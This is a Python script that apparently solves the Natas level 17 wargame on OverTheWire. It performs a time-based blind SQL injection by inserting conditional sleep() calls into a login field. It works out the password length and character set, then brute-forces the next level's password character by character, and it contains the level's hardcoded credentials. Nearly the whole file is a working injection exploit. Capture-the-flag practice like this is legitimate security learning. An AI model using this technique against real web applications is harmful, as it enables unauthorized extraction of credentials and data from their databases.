#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
import string


class natas17():
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password

    def blind_sql_injection(self, query):
        """
        Returns true if query returns one or more rows
        False if query return empty result
        """
        request = requests.post(self.url, auth=(self.user, self.password),
                                data={'username': self.generate_injection(query)})
        return request.elapsed.total_seconds() > 3

    @staticmethod
    def generate_injection(query):
        print('Execurting query: %s' % query)
        return 'natas18" and ' + \
               'if (' + query + ', sleep(4), sleep(1))' + \
               ' and password !="'


    def get_password_length(self, max_length=50):
        print("Determing password length")
        for length in range(1, max_length):
            if self.blind_sql_injection("password like '%s'" % ('_' * length)):
                print ('Password length: %i' % length)
                break

        return length

    def get_alphabet(self):
        """ Shrink possible chars pool """
        alphabet = ''
        for char in string.printable:
            if self.blind_sql_injection("password regexp '.*[%s].*'" % char):
                alphabet += char
        return alphabet

    def brute_password(self):
        password = ''
        length = self.get_password_length()
        alphabet = self.get_alphabet()

        print("""Bruteforcing password with parameters:
                 Length: %i
                 Alphabet: %s""" % (length, alphabet))

        for _ in range(length):
            for char in alphabet:
                if self.blind_sql_injection("password like binary '%s%%'" % (password + char)):
                    password += char
                    break
        return password


crack = natas17(url='http://natas17.natas.labs.overthewire.org/index.php',
                user='natas17',
                password='8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
print "Password: %s" % crack.brute_password()
